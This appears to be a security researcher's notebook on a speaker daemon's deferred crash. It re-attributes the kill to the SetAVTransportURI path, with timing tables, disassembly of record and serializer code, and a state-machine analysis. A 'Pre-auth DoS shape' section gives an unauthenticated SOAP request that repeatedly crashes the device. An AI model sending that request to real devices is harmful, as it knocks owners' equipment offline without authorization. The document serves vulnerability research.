# Queue metadata and the deferred `dc:title` kill (H-003)

Owner LAN, owner devices; addresses as `192.168.4.x`, uuids as `RINCON_…`.

**Status: re-attributed and reproduced.** The deferred kill is real and
reproduces on **`SetAVTransportURI`**, not `AddURIToQueue`. The trigger is not
the title length: it is a stored metadata record pointing at a URI the device
cannot fetch. The queue record's title is *derived from the URI path*, so an
enqueued `dc:title` never reaches it; the queue path can only carry a title as
long as the URI allows (~1007 B after the ~1023 B cap) and kills only rarely.

## The measured facts, and what each is worth now

| # | fact (2026-10-22) | now |
|---|---|---|
| F1 | `AddURIToQueue` with an 8–60 KB `dc:title` answers 200, the daemon dies 72–97 s later, watchdog restart, ICMP up | **mis-attributed**: the kill is the transport record (F10). The queue call itself is clean |
| F2 | a 60 KB item on a *just-cleared* queue survives | still true; a lone queue item always survives (the `uri-single` arm) |
| F3 | the same size inside `<junk>` instead of `dc:title` survives | trivially true — neither reaches the queue record title (F8) |
| F4 | not an inline `strcpy`; deferred work against stored state | confirmed, and now timed at the documented latency (F10) |
| F5 | `SetAVTransportURI` with the same metadata "stores only 629 bytes of title" | the enqueued metadata blob is echoed **in full** by `GetMediaInfo` (2380 B for a 2000 B title). A separate 629-B field may exist but was not found |
| F6 | no store-time cap; `CreateSavedQueue` keeps 2139 B; browse readout truncates at 1023 | saved-queue path yes; **not** the queue-item path (F8) |
| F7 | `Browse` of a queue holding such an item takes >45 s | **not reproduced**: 0.07–2.09 s across every arm |
| F8 | *(2026-11-03)* the queue record's displayed `dc:title` is the **URI filename** | new |
| F9 | *(2026-11-03)* `SetAVTransportURI` retains a 2000-byte title in `GetMediaInfo` | new |
| F10 | *(2026-11-03)* `SetAVTransportURI` with metadata to an **unfetchable** URI kills the daemon (16–195 s, repeatable, re-kills on restart) | new, the reproduction |
| F11 | *(2026-11-03)* the title length is not the trigger — 100 B kills, 8 KB kills, 30 KB kills | new |
| F12 | *(2026-11-03)* metadata **to a fetchable URI** and **no metadata at all** are both clean | new, the controls |

## F8 — the queue record title is derived from the URI

`.84`, empty queue, one item per call, read back with `Queue#Browse`:

| `EnqueuedURI` | enqueued `dc:title` | HTTP | read-back title |
|---|---|---|---|
| `http://192.168.4.160:8903/t.mp3` (reachable) | `ZZSHORT5` | 200 | `t.mp3` (5 B) |
| `x-file-cifs://192.168.4.160/m/x.mp3` | `ZZcifs` | 200 | `x.mp3` |
| `x-file-cifs://…` + `desc cdudn` | `ZZcifsdesc` | 200 | `x.mp3` |
| `x-rincon-mp3radio://http://192.168.4.160:8898/x.mp3` | `ZZSHORT` | 200 | `x.mp3` |
| `http://192.0.2.1/dead.mp3` (unreachable) | `ZZdeadhost` | 200 | `dead.mp3` |
| `x-file-cifs://192.0.2.1/m/dead.mp3` | `ZZcifsdead` | 200 | `dead.mp3` |
| `x-rincon-mp3radio://http://192.0.2.1/dead.mp3` | `ZZmp3radio` | 200 | `dead.mp3` |
| `http://192.0.2.1/…` + a 61 440 B `dc:title` | `ZZBIGCCC…` | 200 | `t.mp3`, Browse 0.22 s |

Reachability, `desc`, and scheme do not matter; the DIDL title is dropped at
enqueue on this build. `x-file-cifs://` and `x-rincon-mp3radio://http://…` are
re-rendered by Browse as `rtsp://` and `mms://` — another sign the readout is
rebuilt rather than stored.

### The only way to lengthen the queue record title

Put the length in the URI filename:

- 2017-byte URI → 200, read-back title **1007 B** (truncated at the readout cap);
- 2500 and 3000-byte URI → 200; 4000 and 8000-byte URI → 500 / UPnP **804**.

So the queue record title cannot exceed ~1023 B, and the maximum achievable
overrun is ~1000 B. Anything bigger needs the transport record.

## F9/F10 — the transport record is the killer, and it is not the title length

`SetAVTransportURI` with a 2000-byte `dc:title`: 200, `GetMediaInfo` returns a
2380-byte `CurrentURIMetaData` carrying the title (the `TrackMetaData` in
`GetPositionInfo` is rebuilt from the URI, 473 B, no title).

`.84`, **empty queue**, one `SetAVTransportURI` per arm (a short record is set
first to clear any previous one), 0.1 s `/status/zp` SWGen poll, 240 s watch:

| URI | metadata | measured runs | deaths | latency |
|---|---|---|---|---|
| `http://192.0.2.1/t.mp3` (unfetchable) | 100 B title | 2 | **yes, 2/2** | +16.5/+47.6 s, +128.5/+161.9/+220.9 s |
| `http://192.0.2.1/t.mp3` | 8192 B title | 2 | **yes, 2/2** | +36.6, +92.1, +186.8, +195.0 s |
| `http://192.0.2.1/t.mp3` | 30 720 B title | 2 | **yes** | ~+155 s; +20.7/+50.0/+154.5 s |
| `http://192.0.2.1/t.mp3` | **none** | 1 | **no** (240 s clean) | — |
| `http://192.168.4.160:8903/t.mp3` (fetchable) | 100 B title | 2 | **no** (240 s clean, both) | — |
| `http://192.168.4.160:9999/t.mp3` (connection refused) | 100 B title | 1 | **yes, 1/1** | +32.7 s |

Every arm that set a metadata-carrying record pointing at an **unfetchable**
URI killed the daemon — blackholed host and refused port alike; neither control
did. `SWGen` stayed `1` and the version stayed `57.23-74170` throughout —
daemon restarts, not reboots.

So the trigger is **stored metadata plus a fetch that cannot complete**, not
the title length, and not the failure mode (timeout and refusal both kill).
Only a successful fetch is clean. The 8–60 KB figure in F1 was a coincidence
of the original test setup; a 100-byte title kills just as well. Latency spans **16–195 s**, so
the 72–97 s figure is the middle of a wider range and any window under ~200 s
can call a live arm clean by mistake.

### Aftermath — the record re-kills

The record was left in place between arms and the daemon kept restarting:
repeated `GONE` events within one arm, up-windows of seconds to minutes, and
one stretch of **more than 12 minutes** with port 1400 closed (13:41–13:53
local). Recovery is by the watchdog, not by the request path, and is slower
than the documented 39–225 s once the queue is in this state.

Consequence for testing: set a short, fetchable record before the next arm, and
retry the first request of an arm on connection failure instead of calling the
arm clean.

## Queue arms — the ordering matrix

Model (`recon/queue9sd/model_h003.py`) predicted order-dependence if the walk
reuses a buffer sized by a neighbour. Six arms plus a standing watch, queue
cleared and verified empty before each arm, identical bytes within an arm,
120–150 s watch, Browse at +90 s, 60 s spacing:

| arm | carrier | order | runs | deaths |
|---|---|---|---|---|
| blob-single | 61 440 B DIDL title | alone | 1 | 0 |
| blob-short-big | 8 B, then 61 440 B | [short, big] | 1 | 0 |
| blob-big-short | 61 440 B, then 8 B | [big, short] | 1 | 0 |
| uri-single | 3017 B URI (1007 B title) | alone | 1 | 0 |
| uri-short-long | 22 B URI, then 3017 B URI | [short, long] | 8 | **1** (2 restarts, +50.3 s and +96.9 s) |
| uri-long-short | 3017 B URI, then 22 B URI | [long, short] | 1 | 0 |
| watch-only | standing [short, long], 10 min, no edits | — | 1 | 0 |

- **Blob size alone is not the trigger** — three arms, 61 440 B in position 2,
  all clean. The 2026-10-22 attribution to the *queue* does not survive.
- The single queue positive fits the neighbour-sized-buffer reading:
  `[short, long]` overflows, `[long, short]` and `[long]` alone fit.
- 1/8 is a weak rate, and a 10-minute standing watch on the same queue was
  clean, so something else gates it. The overrun is only ~1000 B — small enough
  that the corruption often lands somewhere harmless.

Harness: `recon/queue9sd/h003_arms.py`; log `logs/h003_arms_20261103.log`;
per-arm JSON `logs/h003_arms.json`.

## Wire recipe (the parts that cost time)

Queue actions live on the **Queue service**, not AVTransport:

- `urn:schemas-sonos-com:service:Queue:1` at `/MediaRenderer/Queue/Control`;
- action names are `AddURI`, `RemoveAllTracks`, `RemoveTrackRange`, `Browse`;
- the container argument is `QueueID` (value `0`), **not** `InstanceID`;
- `AddURI` and `RemoveAllTracks` both require the current `UpdateID`
  (read it from `Browse`);
- `EnqueuedURIMetaData` must be **XML-escaped** DIDL. Unescaped DIDL answers
  500/402 on every scheme — this blocked the first attempts.

Queue work must be addressed to the **coordinator** (`.84`); a stereo-pair
right channel answers 800 to every queue action.

## What is falsified, what is not

- Falsified: the kill is a queue-metadata (`AddURIToQueue`) effect; a multi-KB
  DIDL title reaches the queue record; a queue holding a big-title item browses
  slowly; the trigger is the title length at all.
- Not falsified: deferred work against a stored record. It is the *transport*
  record that stores the metadata, and a 100-byte title is enough.
- **Narrowed 2026-11-03**: the "failure path copies through a buffer the stored
  title+blob already overran" story is right about the *carelessness* (the
  serializer copy has no pre-copy bound and checks only afterwards, log-only)
  but wrong about the arithmetic — the store caps a blob at 1024 and a name at
  64, so the reachable render is ≤ 1095 against a 1112-byte buffer. Size cannot
  be the trigger; the kill rides on state. See "The pass state machine".

## Pre-auth DoS shape (new)

`SetAVTransportURI` is unauthenticated and needs no queue, no playback and no
state:

```
POST /MediaRenderer/AVTransport/Control
SOAPACTION: "urn:schemas-upnp-org:service:AVTransport:1#SetAVTransportURI"

<InstanceID>0</InstanceID>
<CurrentURI>http://<unreachable>/t.mp3</CurrentURI>
<CurrentURIMetaData>&lt;DIDL-Lite … &lt;dc:title&gt;X&lt;/dc:title&gt; …&lt;/DIDL-Lite&gt;</CurrentURIMetaData>
```

→ 200, daemon restarts from +16 s onward, repeatedly, and the unit stays
degraded for minutes. 100 bytes of title is enough; the URI must be
unfetchable.

## The record write and its bounds (2026-11-03, static on 57.23-74170-1-16)

Follow-up demanded by the re-attribution: read the record write itself and the
fetch-failure branch, and say whether the carrier is controllable. Build
`bea55150…` (`opt/bin/anacapad`, PPC). Addresses are vaddrs; the file's own
`st_value`-based PLT stubs are named from `.dynsym`.

**Record shape** (rec = `*(this+23580)` in the deferred pass `0x10224254`):

| offset | field |
|---|---|
| `+0` | name, written with `strlcpy(rec, src, 65)` → **64 B cap** (`0x10224c2c`) |
| `+0x44` | tag word (`0x10224c60`) |
| `+0x48` | blob, `memcpy(rec+72, src+60, len)` (`0x10224c68`) |
| `+0x448` | blob length, guarded `0 < len ≤ 1024` **before** the copy (`0x10224c38`–`0x10224c50`) |

The guard does not truncate: `len > 1024` skips the length store **and** the
copy (`0x10224c4c`), so a metadata blob above 1 KB is dropped from the record
without a log. The blob field is therefore exactly 1024 bytes and the record
ends at `+0x44C`.

**The serializer is where the copy is unchecked.** `0x10219848` renders a record
to its wire text in the shared `.bss` record text at `0x1048D5D0`:

```
102198d8  stb  0,-10800(11)   ; 'I'
102198dc  bl   strlen(name)
102198e8  stb  3,1(30)        ; LENGTH BYTE = (u8)strlen  <-- 8-bit, truncates
102198f0  lbz  5,1(30)
102198f4  bl   memcpy         ; memcpy(out+2, name, (u8)strlen)
10219904  stbx 0,29,30        ; 'P', tag, 'Q', two length bytes
10219950  add  3,29,30
10219954  bl   memcpy         ; memcpy(out+len+7, blob, bloblen(rec+0x12A0))
10219958  lwz  0,1096(31)
10219960  cmplwi 7,0,1112     ; capacity check AFTER the copy
10219968  bf   29, …          ; over 1112 only logs (0x102194a0 → line 417)
```

So there is **no pre-copy capacity check**; the only one runs after both copies
and merely logs. Worst case of the reachable arithmetic is `255 + 7 + 1024 =
1286` against an 1112-byte destination — 174 bytes of overrun — but that needs
the name to exceed 64, which the writer above prevents. With the writer's cap
the real maximum is `64 + 7 + 1024 = 1095`, i.e. **the 1112 sizing is safe only
because of a cap enforced at a different call site**. The destination's
neighbourhood is the same scratch arena: the next object starts at
`0x1048D9D0` (base `+0x400`) and the serializer itself keeps its log context at
`0x1048D9D0`/`0x1048DBD8`/`0x1048DA0C`, so an overrun here is silent state
corruption, not an immediate fault — which is what a 16–195 s deferral looks
like.

**Fetch-failure branch** (`0x10203254`, `int start(handle, …, const char *host,
const char *path, …)`): the request and `http://%s%s` are formatted into a
3072-byte frame buffer (`0x10203440`, `snprintf`), sent via `0x1035f2ac`; the
first failure logs `Fast start failed: 0x%x: http://%s%s` (`0x1047B79C`). The
retry path calls the ICY-length probe `0x10203168` (needs ≥ 2 bytes, reads the
`0xHH` hex length), `0x102030c8` (consumes the pending skip from
`this+0x8538/+0x853C`), loops while the attempt counter `sp+16` is below
`sp+4380` (1, raised to 2 on a clean first attempt), then logs
`Normal start failed too 0x%x: http://%s%s` (`0x1047B938`) and reports through
vtable `+44`. Everything on that branch is stack-bounded (1025/3072/64), so the
kill is **not** a stack overflow in the fetch; the record and its state are the
carrier.

### Controllability (measured, `.84`, 2026-11-03 15:44Z, fetchable host)

The metadata blob is the carrier and it is fully attacker-controlled
pre-auth: a 10 382-byte `CurrentURIMetaData` is accepted (200) and the read-back
still carries the head of a 10 000-byte `dc:title`. The **read** side truncates
hard at 4173 bytes (fixed prefix 274, title cut mid-string with no closing
tags) for every title ≥ 4000 — a readout cap, not a store cap. Blob length only
moves the record's own 1 KB guard, not the kill rate (F11).

Also measured: `http://<host>:8903/t.mp3` now answers **404**, and five
`SetAVTransportURI` shots against it left the daemon alive ≥ 60 s. A 404 with a
body is not a failure for this path (the stream opens); only connect
timeout/refusal is.

### Straddle matrix, correct oracle (`.84`, 2026-11-04, `Play` each, 240 s)

| blob | DIDL | deaths | latency |
|---|---|---|---|
| 100 | 376 | 0 | — |
| 800 | 790 | 1 | +107.2 s (back after 0.2 s) |
| 1400 | 1390 | 0 | — |

No size signal, which is what the arithmetic predicts; the rate is noisy and the
dead window here was **0.2 s**, so a 0.2 s poll is at the counting limit and
every count is a lower bound. `0/1/0` is not "size does nothing" evidence, it is
three samples of a low-probability event.

Also worth knowing for anyone continuing: in this module **nearly all dispatch
is virtual**, so the drain (`0x10207488`), its caller, and the stream
constructor (`0x10208844`) have no `bl` callers and no address materialised in
`.text` or `.rodata`. They have to be reached from the objects, not from xrefs;
`0x1048DAF8` (the three-pointer descriptor the engine seeds at `+8`) is a dead
end for that.

## The pass state machine, and what survives a failure (2026-11-03, same build)

The pass is a wire **reader**: states are a byte at `this+8`, set only through
`0x10223d7c(this, state)` (`stb 4, 8(3)`), and each record is a 7-byte header
read into `sp+80` by `0x10223878` followed by a `malloc(1084)` body
(`0x10224ae4`) parsed by `0x102438f8` (kind 172 only, `0x10224b44`).

Transition set (all call sites in `0x10224254`):

| from | to | site |
|---|---|---|
| — | 7 | `0x102244b4` (re-arm, `r27 = 0`) |
| — | 4 | `0x10224674` |
| — | 5 | `0x10224810` |
| — | 3 | `0x10224870` |
| — | 6 | `0x10224ad4` (record body) |
| 6 | 7 | `0x10224c74` (immediately **after** the store) |
| 7 | 8 | `0x10224d88` |
| 8 | 9 | `0x10224fc0` |
| 9/– | 7 | `0x10224fec` |

Teardown is `0x10223e6c(this, err)`: it logs the state and the error, releases
the source (`*(this+4)` → `0x10226284`, `0x10223ed4`), sets **state 0**
unconditionally (`0x10223ee8`) and the walk ends at `0x10224064`. The *record*
is not touched: `23572` (deferred value), `23576` (fallback record) and `23580`
(the record) are cleared only by wire case `0x10225520`–`0x1022552c`.

So, answering the question directly: **a failed or aborted walk leaves the last
record armed**; the next walk re-enters the store and `strlcpy(rec, src, 65)`
always replaces the name, while `rec+0x48`/`rec+0x448` are replaced *only* when
the new stream carries a blob with `0 < len ≤ 1024`. A walk that carries a name
but no storable blob therefore pairs the **new name with the previous blob and
length**. That is the state carry the failure mode rides on.

### Consequence: the 1112 copy is latent, not the trigger

Put together, the reachable render size is bounded by the *store*, not by the
request: `bloblen ≤ 1024` always (a bigger blob is skipped, leaving an older
one), name `≤ 64`. Max total `64 + 7 + 1024 = 1095 < 1112`, so the serializer
cannot be overrun by title or blob size at all. The `(u8)strlen` truncation and
the `255 + 7 + 1024 = 1286` worst case would only bite if the name field were
ever written past 81 bytes without the 65-byte cap. That matches F11 exactly:
size is not the trigger. The unchecked copy stays a real hazard (no pre-copy
check, log-only detection, shared `.bss` destination) but it is not what kills
this build.

## Next

1. Pin the faulting copy: does the pass reach the 1100-byte serializer record
   (`0x1021a41c`) or the 2.1c copy (`0x101cc878` → `0x101ccc9c`)? Instrument the
   fetch-failure branch, not the success branch.
   *(partly done: the serializer copy above is `0x10219854`, reached from
   `0x10219f60`/`0x1021a0fc`; the 2.1c copy is still unread.)*
2. ~~Read the pass state machine: does a failed start leave the record armed?~~
   **Answered above**: yes — the error teardown resets the *source* and state
   only; record fields survive, so a blob-less walk pairs a new name with the
   previous blob. Consequence: answer the *remaining* half — what does the
   consumer of that pair do, i.e. follow `0x1024215c`'s callers for the
   blob-carrying record (`0x102249e4`–`0x10224a3c`, cases of `0x102254xx`) and
   the retry path that re-enters the pass on `-102`/`-36`.
3. Size/shape sweep: ~~does a 404 on a reachable host also kill~~ (answered: no,
   404 is clean). Still open: a DNS failure? A `x-file-cifs://` transport
   record? And the blob *straddle* at 1024 (1024 vs 1025 bytes) on an
   unfetchable URI, since > 1024 is skipped rather than stored.
4. S2: repeat the transport arm on the One (86.10) — its record layout is its
   own RE task.
5. Revisit the queue ordering result only after the transport path is pinned.
